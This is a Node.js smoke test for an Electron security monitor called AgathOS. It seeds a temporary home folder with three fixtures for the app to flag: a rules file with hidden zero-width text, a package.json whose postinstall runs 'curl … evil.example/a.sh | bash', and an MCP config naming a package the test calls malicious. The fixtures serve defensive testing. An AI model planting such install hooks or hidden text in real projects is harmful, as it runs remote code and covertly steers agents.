'use strict';
// AgathOS - starts the real app and checks that it comes up and does its work.
//
//   node test/smoke.js <program> [more arguments for the program]
//
// <program> is the built AgathOS (dist/win-unpacked/AgathOS.exe, or AgathOS.app/Contents/MacOS/AgathOS),
// or an Electron binary followed by the app folder. It needs playwright-core, which is not part of
// the app:  npm install --no-save playwright-core
//
// The app runs with a throw-away home folder that holds three bad files: hidden text in a rules file,
// a package with an install script that downloads and runs code, and an MCP server of a known
// malicious package. So the check proves more than "a window opens": the file scan, the text check,
// the package check, the MCP check and the process list all work on this system.
const fs = require('fs');
const os = require('os');
const path = require('path');

let electron;
try { ({ _electron: electron } = require('playwright-core')); } catch (_) {
  try { ({ _electron: electron } = require('playwright')); } catch (e) {
    console.error('playwright-core is needed:  npm install --no-save playwright-core');
    process.exit(2);
  }
}

const exe = process.argv[2];
if (!exe) { console.error('usage: node test/smoke.js <program> [arguments]'); process.exit(2); }
const extra = process.argv.slice(3);
const want = require('../package.json').version;

let failed = 0;
const say = (s) => console.log(s);
const check = (cond, name, detail) => { if (!cond) failed++; say(`${cond ? 'OK  ' : 'FAIL'} ${name}${!cond && detail !== undefined ? '  ' + JSON.stringify(detail) : ''}`); };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function until(fn, ms, every = 1500) {
  const end = Date.now() + ms;
  let last;
  for (;;) {
    try { last = await fn(); if (last) return last; } catch (e) { last = null; }
    if (Date.now() > end) return last;
    await sleep(every);
  }
}

(async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'agathos-smoke-'));
  const home = path.join(root, 'home');
  const userData = path.join(root, 'userdata');
  const put = (rel, text) => { const f = path.join(home, rel); fs.mkdirSync(path.dirname(f), { recursive: true }); fs.writeFileSync(f, text); };
  put('Documents/proj/AGENTS.md', '# Rules\nBe nice.' + '​‌'.repeat(6) + 'done');
  put('Documents/proj/package.json', JSON.stringify({ name: 'worm-demo', version: '1.0.0', scripts: { postinstall: 'curl -s https://evil.example/a.sh | bash' } }));
  put('.cursor/mcp.json', JSON.stringify({ mcpServers: { mail: { command: 'npx', args: ['-y', 'postmark-mcp'] } } }));

  const env = { ...process.env, HOME: home, USERPROFILE: home };
  const args = [...extra, `--user-data-dir=${userData}`];
  if (process.env.SMOKE_NO_SANDBOX) args.unshift('--no-sandbox', '--disable-gpu', '--disable-dev-shm-usage');
  say(`start: ${exe} ${args.join(' ')}`);
  const app = await electron.launch({ executablePath: exe, args, env, timeout: 120000 });
  let output = '';
  app.process().stdout.on('data', (d) => { output += d; });
  app.process().stderr.on('data', (d) => { output += d; });
  const pageErrors = [];
  const watch = (p) => {
    p.on('pageerror', (e) => pageErrors.push(`pageerror: ${e.message}`));
    p.on('console', (m) => { if (m.type() === 'error') pageErrors.push(`console: ${m.text()}`); });
  };

  const finish = async () => {
    try { await app.evaluate(({ app: a }) => a.exit(0)); } catch (_) { /* already gone */ }
    if (failed) { say('\n--- output of the app ---\n' + output.slice(-3000)); }
    try { fs.rmSync(root, { recursive: true, force: true }); } catch (_) { /* a locked file on Windows: leave it */ }
    say(`\nSMOKE ${failed ? 'FAILED (' + failed + ')' : 'PASSED'}`);
    process.exit(failed ? 1 : 0);
  };
  const stop = setTimeout(() => { say('FAIL the whole check took longer than 5 minutes'); failed++; finish(); }, 5 * 60 * 1000);

  try {
    const v = await app.evaluate(({ app: a }) => ({ electron: process.versions.electron, chrome: process.versions.chrome, node: process.versions.node, platform: process.platform, arch: process.arch, version: a.getVersion(), packaged: a.isPackaged }));
    say(`runtime: ${JSON.stringify(v)}`);
    check(v.version === want, 'the app reports the version of package.json', { app: v.version, package: want });

    const page = await app.firstWindow();
    watch(page);
    await page.waitForLoadState('load');

    // The first scan: all phases done, and (Windows and Mac) the process list answered.
    const needBeat = v.platform === 'win32' || v.platform === 'darwin';
    const snap = await until(async () => {
      const s = await page.evaluate(() => window.agathos.snapshot());
      return s && s.ready && s.lastScan && !s.scanning && (!needBeat || s.heartbeat) ? s : null;
    }, 120000);
    check(!!snap, needBeat ? 'the first scan finishes and the process list answers (heartbeat)' : 'the first scan finishes');
    if (snap) {
      check(snap.watchers.length === 6, 'six watchers', snap.watchers.map((w) => w.id));
      const hidden = snap.files.find((f) => /AGENTS\.md$/.test(f.path));
      check(hidden && hidden.state === 'alarm', 'hidden text in a rules file is found', hidden && hidden.state);
      const pkg = snap.packages.find((p) => p.name === 'worm-demo');
      check(pkg && pkg.state === 'alarm', 'an install script that downloads and runs code is found', pkg && pkg.state);
      const mcp = snap.mcp.find((m) => m.name === 'mail');
      check(mcp && mcp.state === 'alarm', 'an MCP server of a known malicious package is found', mcp && mcp.state);
      check(snap.chainOk === true && snap.events.some((e) => e.key === 'scan.done'), 'the event log is intact and the scan is logged');
      const ui = await page.evaluate(async () => ({ v: window.agathos.version, nav: document.querySelectorAll('.nav-item').length, ui: (await window.agathos.uiState()).version }));
      check(ui.v === want && ui.ui === want && ui.nav >= 6, 'the window draws its pages and talks to the engine', ui);
    }

    // Live view: the pushes arrive once a second.
    const live = await page.evaluate(() => new Promise((resolve) => {
      let n = 0;
      const off = window.agathos.onLive(() => { if (++n >= 2) { off(); resolve(n); } });
      window.agathos.liveWatch(true, 0);
      setTimeout(() => resolve(n), 8000);
    }));
    await page.evaluate(() => window.agathos.liveWatch(false, 0));
    check(live >= 2, 'the live view sends updates', live);

    // A window that was closed comes back (tray "Open", Dock icon, second start).
    await page.evaluate(() => window.agathos.settings({ realtime: false }));
    await app.evaluate(({ BrowserWindow }) => { for (const w of BrowserWindow.getAllWindows()) w.close(); });
    await sleep(1500);
    const gone = await app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows().length);
    await app.evaluate(({ app: a }) => { a.emit('second-instance'); });
    const back = await until(() => app.evaluate(({ BrowserWindow }) => { const w = BrowserWindow.getAllWindows(); return w.length === 1 && w[0].isVisible() && /index\.html/.test(w[0].webContents.getURL()); }), 20000, 1000);
    check(gone === 0 && back, 'a closed window comes back', { windowsAfterClose: gone, back });
    const again = app.windows().find((p) => /index\.html/.test(p.url()));
    if (again) {
      watch(again);
      const alive = await until(() => again.evaluate(async () => { const s = await window.agathos.snapshot(); return s.ready && s.watchers.length === 6; }), 20000, 1000);
      check(!!alive, 'the new window talks to the engine');
    } else check(false, 'the new window has a page');

    // Nothing may have gone wrong in the background.
    const errFile = path.join(userData, 'data', 'errors.log');
    const errText = fs.existsSync(errFile) ? fs.readFileSync(errFile, 'utf8') : '';
    check(!errText, 'no error was caught in the background (errors.log is empty)', errText.slice(0, 1500));
    check(pageErrors.length === 0, 'no errors in the pages', pageErrors.slice(0, 5));
  } catch (e) {
    check(false, 'the check itself ran to the end', String(e && e.stack || e).slice(0, 1500));
  }
  clearTimeout(stop);
  await finish();
})().catch((e) => { console.error('SMOKE ERROR', e); process.exit(2); });
